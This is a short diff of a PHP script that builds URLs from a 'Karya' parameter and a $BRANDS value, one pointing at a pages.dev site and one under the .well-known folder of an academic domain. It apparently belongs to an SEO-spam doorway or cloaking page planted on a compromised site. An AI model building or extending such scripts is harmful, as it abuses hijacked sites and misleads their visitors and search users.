@@ -41,7 +41,7 @@ if (isset($_GET['Karya'])) {
     denied();
     exit();
 }
-$ampnya = "https://karyastkip.pages.dev/?Karya=$BRANDS";
+$ampnya = "https://karyastkip.pages.dev/?Karya=$BRANDS.html";
 $urlpath = "https://karya-ilmiah.stkip-pb.ac.id/.well-known/?Karya=$BRANDS";
 ?>
 
